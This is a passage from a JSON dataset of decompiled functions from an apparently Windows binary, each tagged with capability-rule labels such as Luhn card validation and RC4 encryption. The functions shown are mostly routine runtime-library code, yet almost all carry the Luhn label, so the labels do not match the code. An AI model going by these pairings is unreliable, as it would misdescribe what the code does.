        "decompiled_code": "\nint32_t __cdecl fcn.00403724(int32_t arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    iVar1 = fcn.004020f9(arg_8h, arg_8h + 0x16, &arg_ch);\n    return iVar1 - arg_8h >> 1;\n}\n",
        "token_count": 84
    },
    "0040372e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.0040372e(void)\n\n{\n    int32_t arg_8h;\n    uint32_t arg_8h_00;\n    int32_t iVar1;\n    \n    arg_8h = (*_sym.imp.KERNEL32.dll_GetEnvironmentStringsW)();\n    if (arg_8h == 0) {\n        iVar1 = 0;\n    }\n    else {\n        iVar1 = fcn.004c6d77(arg_8h);\n        arg_8h_00 = iVar1 - arg_8h & 0xfffffffe;\n        iVar1 = fcn.00403ff3(arg_8h_00);\n        if (iVar1 != 0) {\n            fcn.0040576d(iVar1, arg_8h, arg_8h_00);\n        }\n        fcn.00406302(0);\n        (*_sym.imp.KERNEL32.dll_FreeEnvironmentStringsW)(arg_8h);\n    }\n    return iVar1;\n}\n",
        "token_count": 214
    },
    "00403751": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00403751(void)\n\n{\n    fcn.00405fba(0, 0, 0, 0, 0);\n    return;\n}\n",
        "token_count": 38
    },
    "0040376a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040376a(uint32_t arg_8h)\n\n{\n    code *pcVar1;\n    \n    if (arg_8h < 0x80000000) {\n        fcn.00406000(arg_8h * 2);\n        return;\n    }\n    fcn.004050bf();\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 92
    },
    "0040379c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.0040379c(void)\n\n{\n    int32_t arg_8h;\n    int32_t var_4h;\n    \n    arg_8h = fcn.00404331();\n    var_4h = *(arg_8h + 0x4c);\n    fcn.004043d1(arg_8h, &var_4h);\n    return var_4h + 0xa0;\n}\n",
        "token_count": 96
    },
    "004037b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004037b0(uint arg_8h)\n\n{\n    code *pcVar1;\n    \n    pcVar1 = fcn.004c8177(5, \"FlsGetValue\", 0x553234, 0x55323c);\n    if (pcVar1 != NULL) {\n        (**0x573000)(arg_8h);\n        (*pcVar1)();\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x004c8644. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_sym.imp.KERNEL32.dll_TlsGetValue)();\n    return;\n}\n",
        "token_count": 143
    },
    "004037d3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_310h\n\nvoid __cdecl fcn.004037d3(int32_t arg_8h, uint arg_ch, uint *arg_10h, int32_t arg_14h)\n\n{\n    int32_t arg_10h_00;\n    uint *puVar1;\n    uint arg_8h_00;\n    uint var_310h;\n    uint32_t var_4h;\n    \n    arg_10h_00 = arg_14h;\n    var_4h = *0x56cca8 ^ &stack0xfffffffc;\n    if ((arg_14h == 0) || (arg_8h == 0)) {\n        puVar1 = fcn.004039a4();\n        *puVar1 = 0x16;\n        fcn.00403751();\n    }\n    else {\n        arg_8h_00 = fcn.00401794(arg_8h, &arg_ch, &var_310h);\n        fcn.00405a8d(arg_8h_00, &var_310h, arg_10h_00);\n    }\n    if (arg_10h != NULL) {\n        *arg_10h = arg_ch;\n    }\n    fcn.00403085(var_310h);\n    return;\n}\n",
        "token_count": 289
    },
    "004037e2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004037e2(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    uint8_t *puVar2;\n    int32_t iVar3;\n    \n    iVar3 = 0;\n    puVar2 = *(in_ECX + 0x34);\n    if (0 < arg_8h) {\n        do {\n            if (*puVar2 == 0) {\n                return iVar3;\n            }\n            iVar1 = fcn.004060eb(***(in_ECX + 8), *puVar2, 0x8000);\n            if (iVar1 != 0) {\n                puVar2 = puVar2 + 1;\n            }\n            puVar2 = puVar2 + 1;\n            iVar3 = iVar3 + 1;\n        } while (iVar3 < arg_8h);\n    }\n    return iVar3;\n}\n",
        "token_count": 204
    },
    "00403800": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403800(uint32_t arg_8h, uint noname_1, uint arg_10h)\n\n{\n    uint32_t arg_ch;\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t arg_8h_00;\n    int32_t *in_ECX;\n    uint var_8h;\n    uint var_4h;\n    \n    if (arg_8h < 0x7fffffff) {\n        arg_ch = in_ECX[5];\n        iVar2 = fcn.00401de8(arg_8h, arg_ch, 0x7ffffffe);\n        arg_8h_00 = fcn.0040376a(iVar2 + 1);\n        in_ECX[4] = arg_8h;\n        in_ECX[5] = iVar2;\n        fcn.00404c50(arg_8h_00, arg_10h, arg_8h);\n        *(arg_8h_00 + arg_8h * 2) = 0;\n        if (7 < arg_ch) {\n            fcn.00401659(*in_ECX, arg_ch * 2 + 2);\n        }\n        *in_ECX = arg_8h_00;\n        return;\n    }\n    fcn.004038aa();\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 308
    },
    "00403814": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403814(uint *arg_8h)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    uint *in_ECX;\n    uint32_t uVar3;\n    uint var_4h;\n    \n    uVar1 = arg_8h[4];\n    if (7 < arg_8h[5]) {\n        arg_8h = *arg_8h;\n    }\n    if (uVar1 < 8) {\n        *in_ECX = *arg_8h;\n        in_ECX[1] = arg_8h[1];\n        in_ECX[2] = arg_8h[2];\n        in_ECX[3] = arg_8h[3];\n        uVar3 = 7;\n    }\n    else {\n        uVar3 = 0x7ffffffe;\n        if ((uVar1 | 7) < 0x7fffffff) {\n            uVar3 = uVar1 | 7;\n        }\n        uVar2 = fcn.0040376a(uVar3 + 1);\n        *in_ECX = uVar2;\n        fcn.0040576d(uVar2, arg_8h, uVar1 * 2 + 2);\n    }\n    in_ECX[4] = uVar1;\n    in_ECX[5] = uVar3;\n    return;\n}\n",
        "token_count": 305
    },
    "004038c8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nint16_t * __cdecl fcn.004038c8(int16_t *arg_8h, int16_t *arg_ch)\n\n{\n    int16_t iVar1;\n    int16_t iVar2;\n    int16_t *piVar3;\n    \n    if (*arg_8h != 0) {\n        do {\n            if (*arg_ch != 0) {\n                iVar1 = *arg_8h;\n                piVar3 = arg_ch;\n                iVar2 = *arg_ch;\n                do {\n                    if (iVar2 == iVar1) {\n                        return arg_8h;\n                    }\n                    piVar3 = piVar3 + 1;\n                    iVar2 = *piVar3;\n                    iVar1 = *arg_8h;\n                } while (iVar2 != 0);\n            }\n            arg_8h = arg_8h + 1;\n        } while (*arg_8h != 0);\n    }\n    return NULL;\n}\n",
        "token_count": 204
    },
    "00403945": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00403945(int32_t arg_8h)\n\n{\n    return arg_8h * 0x38 + 0x56cd88;\n}\n",
        "token_count": 41
    },
    "00403986": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00403986(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    uint8_t *puVar2;\n    int32_t iVar3;\n    \n    iVar3 = 0;\n    puVar2 = *(in_ECX + 0x34);\n    if (0 < arg_8h) {\n        do {\n            if (*puVar2 == 0) {\n                return iVar3;\n            }\n            iVar1 = fcn.004060eb(***(in_ECX + 8), *puVar2, 0x8000);\n            if (iVar1 != 0) {\n                puVar2 = puVar2 + 1;\n            }\n            puVar2 = puVar2 + 1;\n            iVar3 = iVar3 + 1;\n        } while (iVar3 < arg_8h);\n    }\n    return iVar3;\n}\n",
        "token_count": 203
    },
    "0047ae2d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4ch\n\nvoid __cdecl fcn.0047ae2d(uint arg_8h, uint arg_ch, uint arg_10h, int32_t arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint uVar1;\n    uint in_ECX;\n    uint var_4ch;\n    uint var_ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x56cca8 ^ &stack0xfffffffc;\n    uVar1 = fcn.00404d4f(in_ECX, &var_ch, 0x54d9f0, *(arg_14h + 0x14));\n    uVar1 = fcn.004054ed(&var_4ch, 0x40, uVar1, arg_1ch);\n    fcn.00406041(in_ECX, arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, &var_4ch, uVar1);\n    fcn.00403085(var_4ch);\n    return;\n}\n",
        "token_count": 250
    },
    "004039a4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.004039a4(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.004067f8();\n    if (iVar1 == 0) {\n        return 0x56ce5c;\n    }\n    return iVar1 + 0x10;\n}\n",
        "token_count": 67
    },
    "004039e5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_20h\n\nvoid fcn.004039e5(void)\n\n{\n    int32_t *piVar1;\n    char cVar2;\n    int32_t *in_FS_OFFSET;\n    uint var_1ch;\n    int32_t **var_20h_2;\n    uint *puStack32;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_20h;\n    \n    puStack32 = &var_20h_2;\n    var_10h = 0xffffffff;\n    var_14h = 0x41e2f0;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    cVar2 = fcn.00402108();\n    if (cVar2 == '\\0') {\n        var_10h = 1;\n        fcn.00405443();\n    }\n    piVar1 = *(*var_20h_2 + *(**var_20h_2 + 4) + 0x38);\n    if (piVar1 != NULL) {\n        var_10h = 0;\n        (**(*piVar1 + 8))();\n    }\n    *in_FS_OFFSET = var_18h;\n    return;\n}\n",
        "token_count": 290
    },
    "00403a03": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403a03(int32_t arg_8h, uint32_t arg_ch, int32_t *arg_10h)\n\n{\n    uint32_t uVar1;\n    double dVar2;\n    int32_t iVar3;\n    uint16_t uVar4;\n    \n    dVar2 = CONCAT17(arg_ch._3_1_, CONCAT16(arg_ch._2_1_, CONCAT24(arg_ch, arg_8h)));\n    if (dVar2 == 0.0) {\n        iVar3 = 0;\n    }\n    else if (((arg_ch & 0x7ff00000) == 0) && (((arg_ch & 0xfffff) != 0 || (arg_8h != 0)))) {\n        iVar3 = -0x3fd;\n        if ((arg_ch & 0x100000) == 0) {\n            do {\n                uVar1 = arg_ch * 2;\n                arg_ch._0_2_ = uVar1;\n                arg_ch = uVar1;\n                if (arg_8h < 0) {\n                    arg_ch = uVar1 | 1;\n                }\n                arg_8h = arg_8h * 2;\n                iVar3 = iVar3 + -1;\n            } while ((uVar1 & 0x100000) == 0);\n            arg_ch = uVar1 & 0xffff0000 | arg_ch;\n        }\n        uVar4 = arg_ch >> 0x10 & 0xffef;\n        arg_ch._2_1_ = uVar4;\n        arg_ch._3_1_ = uVar4 >> 8;\n        if (((0.0 < dVar2) << 8 | (dVar2 == 0.0) << 0xe) == 0) {\n            arg_ch._3_1_ = arg_ch._3_1_ | 0x80;\n        }\n        fcn.00405236(arg_8h, CONCAT17(arg_ch._3_1_, CONCAT16(arg_ch._2_1_, CONCAT24(arg_ch, arg_8h))) >> 0x20, 0);\n    }\n    else {\n        fcn.00405236(arg_8h, dVar2 >> 0x20, 0);\n        iVar3 = (arg_ch >> 0x14 & 0x7ff) - 0x3fe;\n    }\n    *arg_10h = iVar3;\n    return;\n}\n",
        "token_count": 537
    },
    "00403a6c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_280h\n// WARNING: Variable defined which should be unmapped: var_260h\n// WARNING: Variable defined which should be unmapped: var_284h\n// WARNING: Variable defined which should be unmapped: var_288h\n\nvoid __cdecl fcn.00403a6c(uint arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint8_t in_AF;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    ulong uVar4;\n    uint *puStack828;\n    uint *puStack824;\n    uint uStack820;\n    uint uStack816;\n    uint var_324h;\n    uint var_298h;\n    uint var_294h;\n    uint var_290h;\n    uint var_28ch;\n    uint var_288h;\n    uint var_284h;\n    uint var_280h;\n    uint var_27ch;\n    uint var_278h;\n    uint var_274h;\n    uint var_270h;\n    uint var_26ch;\n    uint var_268h;\n    uint32_t var_264h;\n    uchar *var_260h;\n    uint var_25ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_4ch;\n    uint *ExceptionInfo;\n    uint *var_4h;\n    \n    uStack816 = 0x17;\n    uStack820 = 0x45e42a;\n    iVar2 = (*_sym.imp.KERNEL32.dll_IsProcessorFeaturePresent)();\n    if (iVar2 != 0) {\n        pcVar1 = swi(0x29);\n        (*pcVar1)();\n    }\n    uStack820 = 3;\n    puStack824 = 0x45e43a;\n    fcn.00404fac();\n    uStack820 = 0x2cc;\n    puStack828 = &fcn.00403a6c::var_324h;\n    puStack824 = NULL;\n    uVar4 = fcn.0040314d();\n    var_264h = (in_NT & 1) * 0x4000 | SCARRY4(&stack0xfffffcc4, 0xc) * 0x800 | (in_IF & 1) * 0x200 | (in_TF & 1) * 0x100\n               | (&stack0xfffffcd0 < 0) * 0x80 | (*0x10 == 0x330) * 0x40 | (in_AF & 1) * 0x10 |\n               ((POPCOUNT(&stack0xfffffcd0 & 0xff) & 1U) == 0) * 4 | 0xfffffff3 < &stack0xfffffcc4 |\n               (in_ID & 1) * 0x200000 | (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 | (in_AC & 1) * 0x40000;\n    var_324h = 0x10001;\n    uStack820 = 0x50;\n    puStack828 = &fcn.00403a6c::var_58h;\n    puStack824 = NULL;\n    var_260h = *0x10;\n    fcn.0040314d();\n    var_27ch = uVar4 >> 0x20;\n    var_274h = uVar4;\n    var_58h = 0x40000015;\n    var_54h = 1;\n    uStack820 = 0x45e4f6;\n    iVar2 = (*_sym.imp.KERNEL32.dll_IsDebuggerPresent)();\n    var_27ch = uVar4 >> 0x20;\n    var_274h = uVar4;\n    uStack820 = 0;\n    ExceptionInfo = &fcn.00403a6c::var_58h;\n    var_4h = &fcn.00403a6c::var_324h;\n    puStack824 = 0x45e516;\n    (*_sym.imp.KERNEL32.dll_SetUnhandledExceptionFilter)();\n    var_27ch = uVar4 >> 0x20;\n    var_274h = uVar4;\n    puStack824 = &fcn.00403a6c::ExceptionInfo;\n    puStack828 = 0x45e520;\n    iVar3 = (*_sym.imp.KERNEL32.dll_UnhandledExceptionFilter)();\n    var_27ch = uVar4 >> 0x20;\n    var_274h = uVar4;\n    if ((iVar3 == 0) && (iVar2 != 1)) {\n        puStack828 = 0x3;\n        fcn.00404fac();\n        var_27ch = uVar4 >> 0x20;\n        var_274h = uVar4;\n    }\n    return;\n}\n",
        "token_count": 1124
    },
    "00403b61": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00403b61(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    \n    cVar1 = **0x56f458;\n    if (cVar1 != '\\0') {\n        if (('/' < cVar1) && (cVar1 < ':')) {\n            *0x56f458 = *0x56f458 + 1;\n            return cVar1 + -0x2f;\n        }\n        iVar2 = 0;\n        while( true ) {\n            if (cVar1 == '@') {\n                if (**0x56f458 != '@') {\n                    *0x56f458 = *0x56f458 + 1;\n                    return -1;\n                }\n                *0x56f458 = *0x56f458 + 1;\n                return iVar2;\n            }\n            if (cVar1 == '\\0') break;\n            if (cVar1 < 'A') {\n                return -1;\n            }\n            if ('P' < cVar1) {\n                return -1;\n            }\n            iVar2 = iVar2 * 0x10 + -0x41 + cVar1;\n            *0x56f458 = *0x56f458 + 1;\n            cVar1 = **0x56f458;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 296
    },
    "00403b7a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint __cdecl fcn.00403b7a(uint arg_8h)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    int32_t unaff_EBP;\n    uint uVar3;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uint var_20h;\n    uint var_1ch;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.00402289(0x56b318, 0x10);\n    if (*(unaff_EBP + 8) < 0x2000) {\n        uVar3 = 0;\n        *(unaff_EBP + -0x1c) = 0;\n        fcn.00406401(7);\n        *(unaff_EBP + -4) = 0;\n        iVar4 = 0;\n        iVar2 = *0x570488;\n        while (*(unaff_EBP + -0x20) = iVar4,  iVar2 <= *(unaff_EBP + 8)) {\n            if (*(iVar4 * 4 + 0x570220) == 0) {\n                iVar2 = fcn.00406299();\n                *(iVar4 * 4 + 0x570220) = iVar2;\n                if (iVar2 == 0) {\n                    uVar3 = 0xc;\n                    *(unaff_EBP + -0x1c) = 0xc;\n                    break;\n                }\n                iVar2 = *0x570488 + 0x40;\n                *0x570488 = iVar2;\n            }\n            iVar4 = iVar4 + 1;\n        }\n        *(unaff_EBP + -4) = 0xfffffffe;\n        fcn.004c9e60();\n    }\n    else {\n        puVar1 = fcn.004039a4();\n        uVar3 = 9;\n        *puVar1 = 9;\n        fcn.00403751();\n    }\n    *in_FS_OFFSET = *(unaff_EBP + -0x10);\n    return uVar3;\n}\n",
        "token_count": 467
    },
    "00403bfc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint16_t * __cdecl fcn.00403bfc(int16_t *arg_8h, int16_t *arg_ch, int16_t *arg_10h)\n\n{\n    if (arg_8h != arg_ch) {\n        do {\n            if (*arg_8h == *arg_10h) {\n                return arg_8h;\n            }\n            arg_8h = arg_8h + 1;\n        } while (arg_8h != arg_ch);\n    }\n    return arg_8h;\n}\n",
        "token_count": 115
    },
    "00403c97": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00403c97(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    \n    fcn.00403215();\n    iVar1 = fcn.00406190(in_ECX + 8, arg_8h * 2);\n    if (iVar1 == 0) {\n        *(in_ECX + 0x14) = 1;\n        iVar1 = 0;\n        *(in_ECX + 0xc) = arg_8h;\n    }\n    else {\n        *(in_ECX + 0xc) = 0;\n        *(in_ECX + 0x14) = 0;\n    }\n    return iVar1;\n}\n",
        "token_count": 161
    },
    "00403cc9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00403cc9(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    uint8_t *puVar2;\n    int32_t iVar3;\n    \n    iVar3 = 0;\n    puVar2 = *(in_ECX + 0x34);\n    if (0 < arg_8h) {\n        do {\n            if (*puVar2 == 0) {\n                return iVar3;\n            }\n            iVar1 = fcn.004060eb(***(in_ECX + 8), *puVar2, 0x8000);\n            if (iVar1 != 0) {\n                puVar2 = puVar2 + 1;\n            }\n            puVar2 = puVar2 + 1;\n            iVar3 = iVar3 + 1;\n        } while (iVar3 < arg_8h);\n    }\n    return iVar3;\n}\n",
        "token_count": 204
    },
    "00403ce7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403ce7(int32_t arg_8h, uint arg_ch, int32_t arg_10h, uint arg_14h, int32_t arg_18h)\n\n{\n    fcn.0040576d(arg_8h, arg_ch, arg_10h * 2);\n    fcn.0040576d(arg_10h * 2 + arg_8h, arg_14h, arg_18h * 2);\n    *(arg_8h + (arg_10h + arg_18h) * 2) = 0;\n    return;\n}\n",
        "token_count": 134
    },
    "00403d55": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403d55(uint32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t arg_10h_00;\n    uint32_t arg_ch_00;\n    uint arg_ch_01;\n    code *pcVar1;\n    int32_t iVar2;\n    uint arg_8h_00;\n    uint *in_ECX;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_10h_00 = in_ECX[4];\n    if (arg_8h <= 0x7ffffffeU - arg_10h_00) {\n        arg_ch_00 = in_ECX[5];\n        iVar2 = fcn.0040355d(arg_10h_00 + arg_8h, arg_ch_00, 0x7ffffffe);\n        arg_8h_00 = fcn.004043b8(iVar2 + 1);\n        in_ECX[4] = arg_10h_00 + arg_8h;\n        in_ECX[5] = iVar2;\n        if (arg_ch_00 < 8) {\n            fcn.00403e2c(arg_8h_00, in_ECX, arg_10h_00, arg_10h, arg_14h);\n        }\n        else {\n            arg_ch_01 = *in_ECX;\n            fcn.00403e2c(arg_8h_00, arg_ch_01, arg_10h_00, arg_10h, arg_14h);\n            fcn.00401659(arg_ch_01, arg_ch_00 * 2 + 2);\n        }\n        *in_ECX = arg_8h_00;\n        return;\n    }\n    fcn.004038aa();\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 425
    },
    "00403d64": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.00403d64(uint lpLocaleName, uint dwCmpFlags, uint lpString1, int32_t arg_14h, uint arg_18h, int32_t arg_1ch)\n\n{\n    int32_t iVar1;\n    \n    if (0 < arg_14h) {\n        arg_14h = fcn.00403e18(lpString1, arg_14h);\n    }\n    if (0 < arg_1ch) {\n        arg_1ch = fcn.00403e18(arg_18h, arg_1ch);\n    }\n    if ((arg_14h == 0) || (arg_1ch == 0)) {\n        if (arg_14h - arg_1ch == 0) {\n            iVar1 = 2;\n        }\n        else {\n            iVar1 = (arg_14h - arg_1ch >> 0x1f & 0xfffffffeU) + 3;\n        }\n    }\n    else {\n        iVar1 = (*_sym.imp.KERNEL32.dll_CompareStringEx)\n                          (lpLocaleName, dwCmpFlags, lpString1, arg_14h, arg_18h, arg_1ch, 0, 0, 0);\n    }\n    return iVar1;\n}\n",
        "token_count": 284
    },
    "00403d91": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403d91(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    fcn.00402b21(arg_8h, arg_ch, arg_10h, 0xffffffff);\n    return;\n}\n",
        "token_count": 57
    },
    "00403d96": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403d96(int32_t arg_8h, uint arg_ch, int32_t arg_10h, int32_t arg_14h, uint arg_18h)\n\n{\n    fcn.0040576d(arg_8h, arg_ch, arg_10h * 2);\n    fcn.00404c50(arg_10h * 2 + arg_8h, arg_18h, arg_14h);\n    *(arg_8h + (arg_10h + arg_14h) * 2) = 0;\n    return;\n}\n",
        "token_count": 131
    },
    "00403d9b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00403d9b(ushort *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint32_t uVar1;\n    uint32_t var_4h;\n    \n    uVar1 = fcn.00404d2c(&var_4h, arg_ch, arg_10h, arg_14h);\n    if (uVar1 < 5) {\n        if (0xffff < var_4h) {\n            var_4h = 0xfffd;\n        }\n        if (arg_8h != NULL) {\n            *arg_8h = var_4h;\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 159
    },
    "00403da5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403da5(uint arg_8h)\n\n{\n    fcn.004c65df(0, arg_8h, 0, 4);\n    return;\n}\n",
        "token_count": 44
    },
    "00479b00": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.00479b00(uint *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint noname_4, uint noname_5, uint32_t *arg_20h, \n            int32_t arg_24h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    \n    iVar1 = fcn.004046a6(&arg_ch, &arg_14h, 0, *(in_ECX + 0xc), 0);\n    if (iVar1 < 0) {\n        *arg_20h = *arg_20h | 2;\n    }\n    else {\n        *(arg_24h + 0x10) = iVar1 >> 1;\n    }\n    *arg_8h = arg_ch;\n    arg_8h[1] = arg_10h;\n    return;\n}\n",
        "token_count": 198
    },
    "00403e2c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403e2c(int32_t arg_8h, uint arg_ch, int32_t arg_10h, uint arg_14h, int32_t arg_18h)\n\n{\n    fcn.0040576d(arg_8h, arg_ch, arg_10h * 2);\n    fcn.0040576d(arg_10h * 2 + arg_8h, arg_14h, arg_18h * 2);\n    *(arg_8h + (arg_10h + arg_18h) * 2) = 0;\n    return;\n}\n",
        "token_count": 135
    },
    "00403eb8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403eb8(uint arg_8h)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    \n    pcVar1 = fcn.004c8177(0x1c, \"AppPolicyGetProcessTerminationMethod\", 0x553504, \"AppPolicyGetProcessTerminationMethod\"\n                         );\n    if (pcVar1 == NULL) {\n        uVar2 = 0xc0000225;\n    }\n    else {\n        (**0x573000)(0xfffffffa, arg_8h);\n        uVar2 = (*pcVar1)();\n    }\n    return uVar2;\n}\n",
        "token_count": 138
    },
    "00403f03": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403f03(uint arg_8h)\n\n{\n    fcn.004a8901(arg_8h, 0, 0);\n    return;\n}\n",
        "token_count": 41
    },
    "00418ae0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
